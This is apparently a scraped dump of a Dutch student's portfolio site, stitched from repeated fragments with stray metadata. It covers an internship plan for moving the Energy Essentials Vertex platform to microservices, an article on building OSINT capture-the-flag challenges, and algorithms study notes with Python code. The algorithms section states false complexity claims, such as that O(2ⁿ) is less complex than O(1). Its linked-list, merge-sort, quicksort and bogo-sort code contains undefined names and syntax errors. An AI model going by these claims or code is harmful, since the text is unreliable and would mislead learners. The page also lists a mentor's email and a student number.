Between components within the monolithic architecture the communication is synchronised. For example the first component needs to communicate something to the second component. This interaction needs to be finished before the second component can interacted with the third component (otherwise it will get blocked). So if one component fails, the whole architecture fails. \n\nSuch an architecture makes it difficult to be updated every once in a while since you maybe need to change another component as well for it to work properly, since an update can cause for example such an interaction problem. \n\nMicro service architecture: everything is composed into small pieces. That means they are independent of one another. They serve only the functionality they are designed for. Micro services do not have to be hosted in one location. So it is obviously way more scalable than a monolithic structure. Micro services are asynchronous. To not confuse you even more I will state the example above a little different: if the third component needs to do something, it doesn't have to wait for the first component to finish its interaction with the second component. Thus they are indepent, they do not get blocked when a communication/interaction is not finished yet. \n\nCurrently Energy Essentials has a software called Vertex which consists out of monolithic architecture. With a structure like domain driven design CQRS even coursing aggregate root. \n\n## Problem and opportunity analysis \n\nEnergy Essentials wants to change the architecture of their Vertex software which is currently monolithic to cloud native architecture, also known as micro services. Their main reason to want to change the current architecture is to make the software solution more scalable. They need to change the way components interact with one another.

I need to get a clear view about what to do and how to achieve this. Therefore it is important learn more about microservice architecture and what is involved in a transition to a microservice like architecture.

Vertex is some kind of automation-platform which benefits the core businesses of the energy market. It develops tools, processes, statistical models, reports and full scale applications that efficiently supports the energy market businesses. \n\n## Team members  \n\nThe team consists of different departments that can provide expert support in multiple areas. If I would need support in, for example, the front-end, I could take my problems to this department. Also when I want technical information about a certain topic I can go to an expert within the company for this. All employees have graduated from both HBO or University in their specialization, and some have expanded their focus in several directions. Also, there is attentive observation of what I as a trainee am doing and they help where necessary.\n\n## Guidance/Support\n\nWithin Energy Essentials Ralph Jansen is going to be my supervisor for this internship. He finished one study* that is ICT related which makes him a compatible supervisor. He meets the criterion given by the Fontys ICT exam board. He will be guiding me in person for a minimun of two hours a week but he will be on location as well for a minimun of 4 days a week if in any case I run into some issues, than he is there to help me out. Ralph will also be the contact person for Fontys, his information can be found at the beginning of the document. \n\n*Zuyd Hogeschool | University of Applied Sciences \n\n# Personal Development Goals \n\nBecause my personal development is also very important, during my internship I will work on a number of personal learning goals in order to work on my professionalism. Below is a brief description of the learning objectives I want to work on.\n\n- Improve my English. I want to see if I can write this internship report without problems since it is a little bit of a challenge for me to write it fully in English. \n\n- Writing in a professional matter is difficult for me so I want to improve this. I find it difficult to get my ideas on paper. Maybe this is due to my dyslexia but nevertheless I want to improve this skill because this is important for any further studies. \n\n- Applying techniques that I have learned during my studies at Fontys on situations in the real business world. I want to get hands-on experience with the things I learned during my studies since this is also really important once I finish my studies so I will be confident enough in my quality of work. \n\n- Accepting flaws within an architectural design. Sometimes when I need to work on software I get frustrated by the way it is built even if it does not interfere with what I need to work on within the software. I always have the urge to rewrite the whole architecture but this is not needed since the software works for the given solution. \n\n\n\n","dir":"/","path":"/microservices","extension":".md","createdAt":"2022-01-17T15:02:36.878Z","updatedAt":"2022-01-17T15:02:36.878Z","bodyPlainText":"\n\n\n\n\n\n**Personal information** \n\n|                  |             |\n| ---------------- | ----------- |\n| Graduation route | S           |\n| Student number:  | 409059      |\n| Name             | Rik Peeters |\n\n**Organization Details** \n\n|              |                                          |\n| ------------ | ---------------------------------------- |\n| Name         | Energy Essentials                        |\n| Address      | Sint Maartenslaan 26, 6221 AX Maastricht |\n| Phone number | 085 303 0080                             |\n| Website      | https://vertex.energyessentials.nl/      |\n\n**Company mentor**\n\n|                  |                                                              |\n| ---------------- | ------------------------------------------------------------ |\n| Name             | Ralph Jansen                                                 |\n| Department       | Software Engineering                                         |\n| Position         | Senior developer                                             |\n| Background study | Zuyd Hogeschool \\| University of Applied Sciences            |\n| Linked-in        | https://www.linkedin.com/in/ralph-jansen-58547716/           |\n| Phone number     | +31 6 /                                                      |\n| Email            | [Ralph.jansen@energyessentials.nl](mailto:Ralph.jansen@energyessentials.nl) |\n\n**Looptijd**\n\n|                 |                 |\n| --------------- | --------------- |\n| Start date      | 7 February 2022 |\n| End date        | 8 July 2022     |\n| ASAM Assignment | No              |\n\n*This internship site meets all the requirements according to the block book, which has been established by the Fontys.*\n\n# Project\n\n## Context\nTo understand the essence of this project I have to explain certain concepts first: \n\nMonolithic architecture: everything is composed into one piece which means that components of the program are interconnected and they depent on eachother. Between components within the monolithic architecture the communication is synchronised. For example the first component needs to communicate something to the second component. This interaction needs to be finished before the second component can interacted with the third component (otherwise it will get blocked). So if one component fails, the whole architecture fails. \n\nSuch an architecture makes it difficult to be updated every once in a while since you maybe need to change another component as well for it to work properly, since an update can cause for example such an interaction problem. \n\nMicro service architecture: everything is composed into small pieces. That means they are independent of one another. They serve only the functionality they are designed for. Micro services do not have to be hosted in one location. So it is obviously way more scalable than a monolithic structure. Micro services are asynchronous. To not confuse you even more I will state the example above a little different: if the third component needs to do something, it doesn't have to wait for the first component to finish its interaction with the second component. Thus they are indepent, they do not get blocked when a communication/interaction is not finished yet. \n\nCurrently Energy Essentials has a software called Vertex which consists out of monolithic architecture. With a structure like domain driven design CQRS even coursing aggregate root. \n\n## Problem and opportunity analysis \n\nEnergy Essentials wants to change the architecture of their Vertex software which is currently monolithic to cloud native architecture, also known as micro services. Their main reason to want to change the current architecture is to make the software solution more scalable. They need to change the way components interact with one another. At the moment they communicate in a synchronized matter (monolithic) but that needs to be changed into asynchronized (micro services). This transition poses different challenges. For example a micro service architecture needs a gateway that knows about all the instances which are the actual micro services. A gateway gives you as a client access to the software by redirecting you to the right service and instance, it is basically the entry point into the system. There are different frameworks for a gateway solution so my job in this project is to find the one that fits the best for this problem. To find the right one I need to do some research first.  \n\nThere are also some things to take into consideration when you want to change a software to a microservice architecture:\n\n- security\n- robustness resiliency testing\n- debugging\n- versioning\n\n\n\n\n## Purpose of the project\n\nThe purpose of  this project became pretty clear when I visited the company for the first time in person. Yorick and Justin introduced me to their idea for my internship. They want to change their current architecture which is monolithic to a cloud native one. Their reason to do this is because cloud native is way more flexible, scalable, resilient and less prone to problems. Monolithic architecture is a little bit out dated and does not fit their current solution any longer so they would prefer a cloud native architecture. An architecture like this is better for a bigger company and ofcourse, Energy Essentials is a lot bigger now than when they started. \n\nTo help me understand the assignment of this internship they had to explain the functionalities and architecture of the current software which is called Vertex.

Often by solving the challenges you can gain access to a server, where you can then find a certain text, which is called flag. Hence the name 'capture the flag'. You can then upload this flag as proof that you have passed the challenge. This will earn you points for yourself or your team.\n\nBut making a challenge is a profession and there are several elements to consider for a successful platform. Below I highlight a few of these elements these are drawn up on personal experience.  \n\n### Theme \n\nTo be politically correct and not make biased judgments, it is helpful to keep a theme in your challenges. A nice theme could be alien invasion. You can hang a nice story on this with some humor that makes the user feel completely in his element. In doing so, you exclude any racism and other issues that may come to the surface.  \n\n### Fact checking \n\nWhen you develop a ctf challenge it is important to make sure that what you have created actually works and is true. For example, in a challenge for the group project I had made a challenge the question read as follows:\n\n```  \nIt’s 12:44pm. You get an SMS from our red team manager - “Hey dude, we have a situation... Call me fast!”\n\nYou fasten your hoodie and dial the number as you step out of bed and into the city's sleepy lights. – \"Hello there.

OSINT belongs to the field of Cyber. OSINT stands for Open Source Intelligence and includes the method of collecting information and intelligence through public sources.\n\nAt Fontys, government trainees and students have to learn what OSINT entails. To keep this subject interesting, a fun and interactive way to demonstrate OSINT must be found. One way to accomplish this is a CTF related to OSINT. CTF stands for \"Capture the flag\" this is a fun and interactive way to accomplish this.  \n\nThis topic gives more insight what OSINT is and what applications it has this seems to me personally very interesting therefore I would like to learn more about this. For the project we had to set up a CTF framework. This framework makes it possible to achieve goals in a fun way with team members. \nThis framework will incorporate all the challenges that our team has developed this semester. I am going to meet this learning goal by creating fun challenges and working out ethics. All challenges can be found in the CTF challenge platform. To create this platform we as a group used the open source framework CTFd. CTFd is a Capture The Flag framework focusing on ease of use and customizability. It comes with everything you need to run a CTF and it's easy to customize with plug-ins and themes. Within this platform I created most of the challenges. These challenges vary from very easy to very difficult. because it seemed to me personally very nice to keep a standard theme I proposed this to the group. They agreed to this. Therefore, we chose the theme alien invasion. This also has the advantage that with this we are always politically correct because we do not use names or have a bias on an organization or person.\n\n# Article \n\n## How to set up a CTF challenge \n\nIn a CTF, the goal is to solve different tasks (challenges) of different categories. Often by solving the challenges you can gain access to a server, where you can then find a certain text, which is called flag. Hence the name 'capture the flag'. You can then upload this flag as proof that you have passed the challenge. This will earn you points for yourself or your team.\n\nBut making a challenge is a profession and there are several elements to consider for a successful platform. Below I highlight a few of these elements these are drawn up on personal experience.  \n\n### Theme \n\nTo be politically correct and not make biased judgments, it is helpful to keep a theme in your challenges. A nice theme could be alien invasion. You can hang a nice story on this with some humor that makes the user feel completely in his element. In doing so, you exclude any racism and other issues that may come to the surface.  \n\n### Fact checking \n\nWhen you develop a ctf challenge it is important to make sure that what you have created actually works and is true. For example, in a challenge for the group project I had made a challenge the question read as follows:\n\n```  \nIt’s 12:44pm. You get an SMS from our red team manager - “Hey dude, we have a situation... Call me fast!”\n\nYou fasten your hoodie and dial the number as you step out of bed and into the city's sleepy lights. – \"Hello there. So, according to a crime-stoppers report, a passerby witnessed an alien attempting to implant awareness into a... Yes, this is going to sound weird... horse. I said something along the lines of 'a giant robot fled quickly' but I can't recall what it was. On his trip to Neuse River middle school, he reported he was only 400 meters beyond the Buffaloe express C. Store station in Raleigh NC. It's off to the side of the road. Find the robot and the house that it was closest to. We can issue an All-Points Bulletin once you've completed that.\"\n```\n\nIn my question I had made up a robot that was on the run in the question it said that the robot was last seen 400 meters away from a store. Only when the challenge was tested by our test team the robot was not found. The reason why was that the robot had already fled 480 meters away and this was not taken into account. Therefore, the question was too unclear and will be tested before it is used in production. \n\n### Gamification \n\nConveying Osint in a way that is both instructive and interactive.

- Computer science](https://classroom.udacity.com/courses/cs313)\n\nArticle before I knew we had to write about the group project :).\n\n# The basics for algorithms \n\nThe simple truth is that algorithms are just ways to do things. They’re processes to solve a type of problem. These problems can be complex however, just because there are difficult algorithms doesn’t mean that all algorithms are that complex.\n\nYou can begin thinking algorithmically by breaking the problem down and building the solution up, or by breaking the problem down and building the solution up. As developers, we have a natural urge to start with the solution. However, I would recommend breaking down the problem first and then creating the solution from there.\n\nThinking in small steps to solve a problem takes time. But it will however help us better understand the problem. The better an algorithm is, the shorter the time is to determine that an algorithm is faster, scientists have developed the big o notation later on we go into further detail. \n\nSo, how do you even begin to think about these problems to solve in the first place. To solve a problem you always need data. This data we call a dataset this data gives us the possibility to do an analysis. Can I solve my problem with the data as it is now or should I first prepare this data so that it meets my needs. If you have answers to these questions we can start solving our problem. To begin with, it is useful to grab a small sample of your original dataset. With this sample we are going to work out our algorithm \n\nUsing that principle for our algorithm, if we can get it to operate correctly with one item entry and then with ten, we can probably get it to work with any number of items. You'll eventually test it with a lot more to confirm. This gradual build-up aids you in comprehending the nuances and identifying the problem's subtle traps. During this process you really get to know the data. \n\nThe running time of an algorithm can very with...\n\n- The size of the input\n- The content structure of the input\n- The type of computer we're using \n- The amount of memory the computer has \n- How the algorithm is implemented \n- The programming language used \n\n## Data structures \n\nA data storage format. It is the collection of values and the format they are stored in, the relationships between the values in the collections as well as the operations applied on the data stored in the structure. These stored data collections are called arrays. These arrays can very per language examples of this are The language Java with homogeneous containers type are type bound. In python we have heterogeneous structures they are not type bound.\n\nIt often occurs that during an algorithm it is necessary to sort or search for data. For these functions several already existing algorithms / data structures have been developed. Some very well-known algorithms are:\n\n Searching:\n\n- Linear search\n- Binary search\n\nSorting:\n\n- Insertion sort\n- Selection sort\n- Bubble sort\n- Heapsort \n- Merge sort \n- Quick sort\n- Radix Sort\n\nData structures elements: \n\n- Array n dimensional & Strings\n- Boolean\n- Trees \n- Tuple & Sets \n- Hashmap and hashtable\n- Linked List \n- Stack and Queues \n\nThankfully, you’ll probably never have to actually implement any of these algorithms as a professional developer. These days, the most efficient search and sort algorithms are provided in standard libraries that come with most languages. But still it is important for you to know how to use one and what the advantages and disadvantages are. \n\n## What makes a good algorithm\n\n### Correctness\n\nSometimes a algothim does not give you a correct answer or the best answer because the only perfect algorithms that we know for those problems take a really, really long time. Fore example lets say we want a programm that would determine the most effiecient oute for a truck that delivers packages. staring and ending the day at a depot. It would take weeks to run to going through all the possibilites. But if we're okay with a program that would determine a route that goed but maybe not the best. Then i could run in seconds in some cases, good is good enough.\n\n### Efficiency \t\n\nAsymptotic analysis allows algorithms to be compared independently of a particular pogramming laungauage or handware. \n\n## Asymptotic notation\n\nLet's think about the running time of an algorithm more carefully. We use a combination of two ideas. First, we determine how long the algorithm takes, in terms of the size of its input. So we think about the running time of the algorithm as a function of the size of its input. The second idea is that we focus on how fast this function grows with the input size. We call that the rate of growth of the running time. To keep things manageable, we simplify the function to distill the most important part and cast aside the less important parts.\n\nWe'll see three forms of it: **big-Θ** notation, **big-O** notation, and **big-Ω** notation.\n\n### Big-Θ notation\n\nWhen we use **big-Θ** notation, we're saying that we have an asymptotically tight bound on the running time. \"Asymptotically\" because it matters for only large values of **n**. \"Tight bound\" because we've nailed the running time to within a constant factor above and below.\n\n### Big O notation\n\nBig-O notation is used by programmers to compare and measure the performance of algorithms. Big O notation is one of the most fundamental tools for computer scientists to analyze the cost of an algorithm. It is a good practice for software engineers to understand in-depth as well. The big O notation gives a strong statement about the worst-case running time. We use big-Θ notation to asymptotically bound the growth of a running time to within constant factors above and below. Sometimes we want to bound from only above. Because big-O notation gives only an asymptotic upper bound, and not an asymptotically tight bound, we can make statements that at first blush seem incorrect, but are technically correct.\n\n<a href=\"/images/projects/minor/algorithm/big_o_notation.jpeg\" target=\"_blank\" rel=\"some text\">\n  <img width=\"80%\" src=\"/images/projects/minor/algorithm/big_o_notation.jpeg\" alt=\"Big O noation\"/>\n</a>\n\n#### O(1) has the least complexity\n\nIf you can build an algorithm that solves the problem in O(1) notation, you are likely at your best possible solution. When the complexity of a scenario exceeds O(1), we can examine it by looking for its O(1/g(n)) equivalent. For instance, O(1/n) is more difficult than O(1/n2).\n\n#### O(log(n)) is more complex than O(1), but less complex than polynomials\n\nBecause sorting algorithms are frequently associated with divide and conquer algorithms, O(log(n)) is a desirable complexity to aim for. Because the square root function can be regarded a polynomial with an exponent of 0.5, O(log(n)) is less difficult than O(n).\n\n#### O(nˣ) Complexity of polynomials increases as the exponent increases\n\nFor example, O(n⁵) is more complex than O(n⁴). Due to the simplicity of it.\n\n#### O(2ⁿ) Exponentials have greater complexity than polynomials as long as the coefficients are positive multiples of n\n\nO(2ⁿ) is more complex than O(n⁹⁹), but O(2ⁿ) is actually less complex than O(1). We generally take 2 as base for exponentials and logarithms because things tends to be binary in Computer Science, but exponents can be changed by changing the coefficients. If not specified, the base for logarithms is assumed to be 2.\n\nyou can write a book about big o notation so much and so big is the subject but for more information I would just google the topic.  \n\n### Big-Ω (Big-Omega) notation\n\nWe might wish to declare that an algorithm takes at least a specific amount of time without specifying a maximum time. The Greek letter \"omega\" is used in big-Ω notation. We use big-Ω notation for **asymptotic lower bounds**, since it bounds the growth of the running time from below for large enough input sizes.\n\n# Lets begin\n\n## Basics\n\n### Arrays:\n\nPython = list = non type bound\n\nJava = array = type bound\n\n### Executions\n\nOperations on Data structures\n\n- Access and read values \n- Search for an arbitrary values \n- Insert values at any point into the structure \n- Delete values in the structure \n\nWe access the data in the array by using the index of the stored positions of the value. Every value in the array has its index with which you can locate it also called an address. The base index in most languages is 0 to n; space = n * m.  \n\n```python\nnew_list = [1, 2, 3]\nresult = new_list[0]\t# 1\nresult = new_list[10] \t# IndexError: list index out of range \n```\n\nYou cannot access an address index that is larger than your instantiated array size. This will always result in an index out of bound error.   \n\nLets now search for a value in our list with Linear search:\n\n```python\nif 1 in new_list : print(True)\n    \nfor n in new_list:\n    if n == 1:\n        print(True)\n        break\n```\n\nLets insert a new value in the array: there are two methods to do so one on linear runtime and on constant time Append. They're different in that insert linear will insert in every given index and append will add to the array. But it also depends on the language we use. \n\n```python\nnumbers = [] # Default 1 element can be inserted \nlen(numbers) # Will give 0 as answer \nnumbers.append(2)\nnumbers.append(200) # Will execute resize array \n\n```\n\nThe append function will only increase the when the index will hit size 0, 4, 8, 16, 25, 35, 46... and so on we call this amortized constant space complexity. \n\n```python\n# Big-O of K | K = Number of items we append\nnumbers = []\nnumbers.extend([4, 5, 6]) # Makes a serie of append calls\n```\n\n## Linked list \n\nEach data structure solves a particular problem. Arrays are particularly good at accessing/reading values that will happen in constant time. But arrays are pretty bad at inserting and deleting which both run at linear time. Linked lists on the other hand are somewhat better at this although it has some problems. They are trying to solve a problem that involves far more inserts and deletes than accessing. A linked list can be a better tool than an array.\n\nA linked list is a linear data structure where each element in the list is contained in a separate object called a node. A node models two pieces of information an individual item of the data we want to store and a reference to the next node in the list. The first node in the linked list is called the head of the list. While the last node is called the tail. The head and the tail nodes are special the list only maintains a reference to the head although in some implementations it keeps a reference to the tail as well. Every node other than the tail point to the next node in the list. But the tail doesn't point to anything this is how we know it's the end of the list. Nodes are what called self-referential objects. Linked lists usually come in two forms a singly linked list where each node stores a reference to the next node in the list or a doubly linked list where each node stores a reference to both the node before and after\n\n```python\nclass Node: \n    # An object for storing a single node of a linked list\n    # Models tow attributes - data and the link to the next node in the \t\tlist\n    \n    data = None # To hold on to the data we are storing\n    next_node = None # To point to the next node in the list\n    \n    def __init__(self, data):\n        self.data = data\n        \n    def __repr__(self):\n        return \"<Node data: %s>\" % self.data # ToString value\n    \nclass LinkedList:\n\t# Singly linked list\n  \n    def __init__(self):\n        self.head = None\n    \n    def is_empy(self):\n        return self.head == None\n    \n    def size(self):\n        # Return the number of nodes in the list \n        # Takes 0(n) / linear time\n        \n        current = self.head\n        count = 0\n        \n        while current:\n            count += 1\n            current = current.next_node\n        \n        return count\n\n  \tdef add(self, data):\n        # Adds new Node container data at head of the list\n        # Takes 0(1) time\n        \n        new_node = Node(data)\n        new_node.next_node = self.head\n        self.head = new_node\n        \n    def search(self, key):\n        # Search for the first node containing data that maches the key\n        # Return the node or 'None' if not found\n        # Takes 0(n) time\n        \n        current = self.head\n        \n        while current:\n            if current.data == key:\n                return current \n            else:\n                current = current.next_node\n                \n        return None\n    \n    def insert(self, data, index):\n        # Inserts a new Node containing data at index position \n        # Insertion takes 0(1) time but infing the node at the insertion point take 0(n time)\n        # Takes overal 0(n) time\n        \n        if index == 0 :\n            self.add(data)\n        \n        if index > 0:\n            new = Node(data)\n            \n            position = index \n            current = self.head\n            \n            while position > 1:\n                current = node.next_node\n                position -= 1 \n                \n            prev_node = current \n            next_node = current.next_node \n            \n            prev_node.next_node = new \n            new.next_node = next_node\n    \n    def remove(self, key):\n        # Removes Node containing data that matches the key\n        # Return the node of None if key doesn't exists\n        # Takes 0(n) time\n        \n        current = self.head\n        previous = None;\n        found = False\n        \n        while current and not found:\n            if current.data == key and current == self.head:\n                found = True\n                self.head = current.next_node\n            elif current.data == key:\n                found = True \n                previous.next_node = current.next_node\n            else:\n                previous = current\n                current = current.next_node\n                \n        return current     \n        \n    def node_at_index(self, index):\n        if index == 0:\n            return self.head\n        else:\n            current = self.head\n            position = 0\n        \n        while position < index:\n            current = current.next_node\n            possition += 1 \n        \n        return current\n        \n    def __repr__(self):\n        # Return a string representation of the list\n        # Takes 0(n) time\n        \n        nodes = []\n        current = self.head\n        \n        while current:\n            if current is self.head:\n                nodes.append(\"[Head: %s]\" % current.data)\n            elif current.next_node is None:\n                nodes.append(\"[Tail: %s]\" % current.data)\n            else:\n                nodes.append(\"[%s]\" % current.data)\n            \n            current = current.next_node\n       \treturn '-> '.join(nodes)\n\t\t \n        \n        \n# [Head],[],[],[],[Tail]\nl = LinkedList()\nl.add(1)\nl.size() # returns 1 \nl.add(2)\nl.add(3)\nl.size() # returns 3\n\nl # returns [Head: 3]-> [2]-> [Tail: 1]\n        \n```\n\nHead can be seen as the top of an book pile its the first book you pick from the pile. Unlike arrays where when you insert an element into the array all element after the particular index need to be shifted. With a linked list we just need to change the references to next on a few nodes. This way we can insert a node at any point in the list in constant time.\n\n## Merge sort\n\nMerge sort works like binary sort by splitting up the problem into sub problems. But it takes it one step further. In the first sequence we split the array into two smaller arrays on the second sequence we are going to split the first sequence again and so on until we are down to single element arrays. After that the merge sort algorithm works backwards. By repeatedly merging the single element arrays and sorting them at the same time.\n\nSolving a problem like this by recursively breaking down the problem into subparts until it is easily solvable is an algorithmic strategy called divide and conquer. \n\n```python\ndef merge_sort(list):\n    # Sorts a list in ascending order \n    # Return a new sorted list \n    \n    # Devide: Find the midpoint of the list and divide into sublists\n    # Conquer: Recursively sort the sublist created in previous step\n    # Combine: Merge the sorted sublists created in previous step \n    \n    # Takes O(kn log n) time\n    \n    if len(list) <= 1:\n        return list \n    \n    left_half, right_half = split(list)\n    \n    left = merge_sort(left_half)\n    right = merge_sort(right_half)\n    \n    return merge(left, right)\n\ndef split(list):\n    # Divide the unsorted list at midpoint into sublists\n    # Returns two sublists - left and right\n    \n    # Takes overal O(k log n) time\n    \n    min = len(list)//2\n    left = list[:mid] # list[0:mid]            Takes n of k \n    right = list[mid:] # list[mid:len(list)]\n    \n    return left, right\n\ndef merge(left, right):\n    # Merges two lists (arrays), sorting them in the process\n    # Return a new merged list\n    \n    # Runs in overal O(n) time\n    \n    l = []\n    i = 0\n    j = 0\n    \n    while i < len(left) and j < len(right):\n        if left[i] < right[j]:\n            l.append(left[i])\n            i += 1\n        elif left[i] >= right[j]:\n            l.append(right[j])\n            j += 1\n   \n    while i < len(left):\n        l.append(left[i])\n        i += 1 \n        \n    while j < len(right):\n        l.append(right[j])\n        j += 1\n     \n    return l\n\ndef verify_sorted(list):\n    n = len(list)\n    \n    # Stopping condition \n    if n == 0 or n == 1: \n        return true\n    \n    return list[0] < list[1] and verify_sorted(list[1:])\n \t# [1, 2, 3, 4, 5]\n    # [2, 3, 4, 5]\n    # [3, 4, 5]\n    # [4, 5]\n    # [5]\n\n        \nalist = [54, 62, 93, 17, 77, 31, 44, 55, 20]\nl = merge_sort(alist)\nprint(l) # Return [17, 20, 31, 44, 54, 62, 77, 93]\nprint(verify_sorted(alist)) # Return False\nprint(verify_sorted(l)) # Return True\n```\n\n### Linked list merge sort\n\n```python\nfrom linked_list import LinkedList\n\ndef merge_sort(linked_list):\n    # Sorts a linked list in ascending order\n    # -

Recursive functions are difficult to understand. The flow of control is quite complex.\n\n```python\n# Normal\ndef sum(numbers):\n    total = 0\n    for number in numbers:\n        total += number\n    return total\n\nprint(sum([1, 2, 7, 9]))\n```\n\n```python\n# Recursion\ndef sum(numbers):\n    if not numbers: \n        return 0 \n    print(\"Calling sum(%s)\" % numbers[1:])\n \tremaining_sum = sum(numbers[1:])\n    print(\"Call to sum(%s) returning %d + %d\" % (numbers, numbers[0], remaining_sum))\n    return numbers[0] + remaining_sum\n\nprint(sum([1, 2, 7, 9]))\n# Calling sum([2, 7, 9])\n# Calling sum([7, 9])\n# Calling sum([9])\n# Calling sum([])\n# Call sum([9]) returning 9 + 0\n# Call sum([7, 9]) returning 7 + 9\n# Call sum([2, 7, 9]) returning 2 + 16\n# Call sum([1, 2, 7, 9]) returning 1 + 18\n# Result: 19\n```\n\n## Quick Sort\n\nQuickSort is a Divide and Conquer algorithm. It picks an element as pivot and partitions the given array around the picked pivot. There are many different versions of quickSort that pick pivot in different ways. \n\nList: [4, 6, 3, 2, 9, 7, 3, 5]\n\n​\tPivot: [4]\n\n​\tLess than pivot: [3, 2, 3]  ->  [2, 3] [3] [ ]  ->  [ ] [2] [3] = [2, 3]  ->  [2, 3] [3] [ ]  ->  [2, 3, 3]\n\n​\tGreater than pivot: [6, 9, 7, 5] -> [5] [6] [9, 7]  ->  [5, 6, 7, 9]\n\n  [2, 3, 3, 4, 5, 6, 7, 9]\n\n```python\nimport sys\nfrom load import load_numbers\n\nnumbers = load_numbers(sys.argv[1])\n\ndef quicksort(values):\n    if len(values) <= 1:\n        return values \n    less_than_pivot = []\n    greater_than_pivot = []\n    pivot = value[0]\n    \n    for value in values[1:]:\n        if value <= pivot:\n            less_than_pivot.append(value)\n        else :\n            greater_than_pivot.append(value)\n    \n    print(\"%15s %1s %-15s\" % (less_than_pivot, pivot, greater_than_pivot))\n    return quicksort(less_than_pivot) + [pivot] + quicksort(greater_than_pivot)\n\nprint(numbers) \n# [4, 6, 3, 2, 9, 7, 3, 5]\nsorted_number = quicksort(numbers)\n# [3, 2, 3] 4 [6, 9, 7, 5]\n# \t [2, 3] 3 []\n#        [] 2 [3]\n#       [5] 6 [9, 7]\n#       [7] 9 []\nprint(sorted_numbers) \n# [2, 3, 3, 4, 5, 6, 7, 9]\n```\n\n## Selection sort\n\nAlso a bad sorting sorting algorithm. With each loop we will look through each of the values in the unsorted array and find the smallest value and move that value to the end of the sorted array. We start with the first value in the unsorted and say its the minimum or smallest value we have seen so far for now. Than we will look at the next value and see if that one is smaller than the current smallest value if so we mark is as the new minimum. We continue that way until we reach the end of the list. We know that the value that we have marked is the smallest value in the array. Than we move that value from the current list to a new list called sorted and we delete it from the current list. We do this until there are no more items in the unsorted array. \n\n```python\nimport sys\nfrom load import load_numbers\n\nnumbers = load_numbers(sys.argv[1])\n\ndef selection_sort(values):\n    sorted_list = []\n    print(\"%-25s %-25s\" % (values, sorted_list))\n    for i in range(0, len(values)):\n        index_to_move = index_of_min(values)\n        sorted_list.append(values.pop(index_to_move))\n        print(\"%-25s %-25s\" % (values, sorted_list))\n    return sorted_list \n\ndef index_of_min(values):\n    min_index = 0\n    for i in range(1, len(values)):\n        if values[i] < values[min_index]:\n            min_index = i\n    return min_index\n\nprint(selection_sort(numbers))\n```\n\n## Bogo Sort \n\nBad sorting randomly switching numbers till its sorted. Stumbling on a solution is literally a matter of luck and for lists with more than a few items it might never happen.\n\n```python\nimport random\nimport sys\nfrom load import load_number \n\nnumber = load_numbers(sys.argv[1])\n\ndef is_sorted(values):\n    for index in range(len(values) - 1)\n     \tif values[index] > values[index + 1]:\n            return False\n    return True\n\ndef bogo_sort(values):\n    attempts = 0\n    while not is_sorted(values):\n        print(attempts)\n        random.shuffle(values)\n        attempts += 1\n    return values \n\nprint(bogo_sort(numbers))\n\n```\n\n","dir":"/projects/minor","path":"/projects/minor/algorithmics","extension":".md","updatedAt":"2022-01-17T15:02:36.882Z","bodyPlainText":"\n\n\n[Udacity - Computer science](https://classroom.udacity.com/courses/cs313)\n\nArticle before I knew we had to write about the group project :).\n\n# The basics for algorithms \n\nThe simple truth is that algorithms are just ways to do things. They’re processes to solve a type of problem. These problems can be complex however, just because there are difficult algorithms doesn’t mean that all algorithms are that complex.\n\nYou can begin thinking algorithmically by breaking the problem down and building the solution up, or by breaking the problem down and building the solution up. As developers, we have a natural urge to start with the solution. However, I would recommend breaking down the problem first and then creating the solution from there.\n\nThinking in small steps to solve a problem takes time. But it will however help us better understand the problem. The better an algorithm is, the shorter the time is to determine that an algorithm is faster, scientists have developed the big o notation later on we go into further detail. \n\nSo, how do you even begin to think about these problems to solve in the first place. To solve a problem you always need data. This data we call a dataset this data gives us the possibility to do an analysis. Can I solve my problem with the data as it is now or should I first prepare this data so that it meets my needs. If you have answers to these questions we can start solving our problem. To begin with, it is useful to grab a small sample of your original dataset. With this sample we are going to work out our algorithm \n\nUsing that principle for our algorithm, if we can get it to operate correctly with one item entry and then with ten, we can probably get it to work with any number of items. You'll eventually test it with a lot more to confirm. This gradual build-up aids you in comprehending the nuances and identifying the problem's subtle traps. During this process you really get to know the data. \n\nThe running time of an algorithm can very with...\n\n- The size of the input\n- The content structure of the input\n- The type of computer we're using \n- The amount of memory the computer has \n- How the algorithm is implemented \n- The programming language used \n\n## Data structures \n\nA data storage format. It is the collection of values and the format they are stored in, the relationships between the values in the collections as well as the operations applied on the data stored in the structure. These stored data collections are called arrays. These arrays can very per language examples of this are The language Java with homogeneous containers type are type bound. In python we have heterogeneous structures they are not type bound.\n\nIt often occurs that during an algorithm it is necessary to sort or search for data. For these functions several already existing algorithms / data structures have been developed. Some very well-known algorithms are:\n\n Searching:\n\n- Linear search\n- Binary search\n\nSorting:\n\n- Insertion sort\n- Selection sort\n- Bubble sort\n- Heapsort \n- Merge sort \n- Quick sort\n- Radix Sort\n\nData structures elements: \n\n- Array n dimensional & Strings\n- Boolean\n- Trees \n- Tuple & Sets \n- Hashmap and hashtable\n- Linked List \n- Stack and Queues \n\nThankfully, you’ll probably never have to actually implement any of these algorithms as a professional developer. These days, the most efficient search and sort algorithms are provided in standard libraries that come with most languages. But still it is important for you to know how to use one and what the advantages and disadvantages are. \n\n## What makes a good algorithm\n\n### Correctness\n\nSometimes a algothim does not give you a correct answer or the best answer because the only perfect algorithms that we know for those problems take a really, really long time. Fore example lets say we want a programm that would determine the most effiecient oute for a truck that delivers packages. staring and ending the day at a depot. It would take weeks to run to going through all the possibilites. But if we're okay with a program that would determine a route that goed but maybe not the best. Then i could run in seconds in some cases, good is good enough.\n\n### Efficiency \t\n\nAsymptotic analysis allows algorithms to be compared independently of a particular pogramming laungauage or handware. \n\n## Asymptotic notation\n\nLet's think about the running time of an algorithm more carefully. We use a combination of two ideas. First, we determine how long the algorithm takes, in terms of the size of its input. So we think about the running time of the algorithm as a function of the size of its input. The second idea is that we focus on how fast this function grows with the input size. We call that the rate of growth of the running time. To keep things manageable, we simplify the function to distill the most important part and cast aside the less important parts.\n\nWe'll see three forms of it: **big-Θ** notation, **big-O** notation, and **big-Ω** notation.\n\n### Big-Θ notation\n\nWhen we use **big-Θ** notation, we're saying that we have an asymptotically tight bound on the running time. \"Asymptotically\" because it matters for only large values of **n**. \"Tight bound\" because we've nailed the running time to within a constant factor above and below.\n\n### Big O notation\n\nBig-O notation is used by programmers to compare and measure the performance of algorithms. Big O notation is one of the most fundamental tools for computer scientists to analyze the cost of an algorithm. It is a good practice for software engineers to understand in-depth as well. The big O notation gives a strong statement about the worst-case running time. We use big-Θ notation to asymptotically bound the growth of a running time to within constant factors above and below. Sometimes we want to bound from only above. Because big-O 